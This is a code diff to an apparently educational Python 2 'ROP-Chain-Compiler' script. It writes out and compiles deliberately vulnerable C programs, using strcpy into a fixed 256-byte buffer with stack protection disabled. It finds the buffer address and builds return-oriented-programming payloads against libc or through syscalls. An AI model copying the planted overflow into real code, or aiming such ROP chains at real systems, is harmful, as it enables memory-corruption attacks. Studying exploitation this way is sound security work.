@@ -877,32 +877,62 @@ def find_library_base_addr(vuln_binary, library_path):
     os.remove("./test.gdb")
     return library_base_addr
 
-def find_buffer_addr(vuln_binary, payload_length):
-    with io.FileIO("find_buf.gdb", "w") as file:
-        file.write("b main\nrun " + "A"*payload_length +"\np/x &buf[0]\n")
+def find_buffer_addr(vuln_binary, payload_length, use_gdb):
+    test_program_to_find_buf_addr()
+    if use_gdb == 1:
+        with io.FileIO("find_buf.gdb", "w") as file:
+            file.write("b main\nrun " + "A"*payload_length +"\np/x &buf[0]\n")
 
-    cmd = "gdb --batch --command=./find_buf.gdb --args ./mprotect-shellcode/vuln2 " + "A"*payload_length + "|tail -1|awk '{print $3}'"
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
-    proc.wait()
-    try:
-        buffer_addr = int(proc.stdout.read(), 16)
-    except Exception as e:
-        print "Error finding library base address %s" %(str(e))
-        return 0
+        cmd = "gdb --batch --command=./find_buf.gdb --args ./vuln2 " + "A"*payload_length + "|tail -1|awk '{print $3}'"
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        proc.wait()
+        try:
+            buffer_addr = int(proc.stdout.read(), 16)
+            return buffer_addr
+        except Exception as e:
+            print "Error finding buffer address %s" %(str(e))
+            return 0
+        os.remove("./find_buf.gdb")
+    else:
+        cmd = "./vuln2 " + "A"*payload_length + "|grep \"Address of buf\"|awk '{print $5}'"
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        proc.wait()
+        try:
+            buffer_addr = int(proc.stdout.read(), 16)
+            return buffer_addr
+        except Exception as e:
+            print "Error finding buffer address %s" %(str(e))
+            return 0
+    return 0
 
-    os.remove("./find_buf.gdb")
-    return buffer_addr
-
-def compile_binary(libraries):
-    rm_command = "rm -rf ./mprotect-shellcode/vuln2"
+def test_program_to_find_buf_addr():
+    program = "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(int argc, char *argv[])\n{\n\tchar buf[256];\n\tstrcpy(buf, argv[1]);\n\tprintf(\"Address of buf = %p\\n\", &buf[0]);\n\tprintf(\"Input: %s\\n\", buf);\n\texit(1);\n\treturn 0;\n}\n"
+    with io.FileIO("vuln2.c", "w") as file:
+        file.write(program)
+    rm_command = "rm -rf ./vuln2"
     rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
     rmproc.wait()
-    compile_command = "gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o mprotect-shellcode/vuln2"
+    write_vulnerable_program()
+    compile_command = "gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln2 vuln2.c"
+    proc = subprocess.Popen(compile_command, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+
+def write_vulnerable_program():
+    program = "#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char *argv[])\n{\n\tchar buf[256];\n\tstrcpy(buf, argv[1]);\n\tprintf(\"Input: %s\\n\", buf);\n\treturn 0;\n}\n"
+    with io.FileIO("vuln.c", "w") as file:
+        file.write(program)
+
+def compile_binary(libraries):
+    rm_command = "rm -rf ./vuln"
+    rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
+    rmproc.wait()
+    write_vulnerable_program()
+    compile_command = "gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln"
     linker_flags = ""
     for lib in libraries:
         lib_path = os.path.realpath(lib)
         linker_flags += " -L" + os.path.dirname(lib_path) + " -l:" + os.path.basename(lib_path)
-    compile_command += linker_flags + " mprotect-shellcode/vuln2.c"
+    compile_command += linker_flags + " vuln.c"
     proc = subprocess.Popen(compile_command, shell=True, stdout=subprocess.PIPE)
     proc.wait()
 
@@ -911,7 +941,7 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser('ROP-Chain-Compiler')
     #parser.add_argument("vuln_bin", type=str, help="Path to vulnerable binary (ROP tester)")
-    vuln_bin = 'mprotect-shellcode/vuln2' 
+    vuln_bin = 'vuln' 
     parser.add_argument("lib", type=str, help="Libraries which are linked in vulnerable binary")
     parser.add_argument("-p", action='store_true', help="Print all gadgets") 
     args = parser.parse_args()
@@ -936,12 +966,15 @@ if __name__ == '__main__':
     rop_payload = ""
 
     if (len(libraries) == 1) and (libraries[0].count("libc") == 1):
-        buffer_address = find_buffer_addr(vuln_bin, 392)
+        buffer_address = find_buffer_addr(vuln_bin, 392, 0)
         rop_payload = build_rop_chain_libc(lib_list, buffer_address)
     else:
-        buffer_address = find_buffer_addr(vuln_bin, 416)
+        buffer_address = find_buffer_addr(vuln_bin, 416, 0)
         rop_payload = build_rop_chain_syscall_generic(lib_list, buffer_address)
 
+    rm_command = "rm -rf ./vuln2 ./vuln2.c"
+    rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
+    rmproc.wait()
     #build_rop_chain_libc_syscalls(lib_list, buf_address)
 
     print_rop_payload(rop_payload)
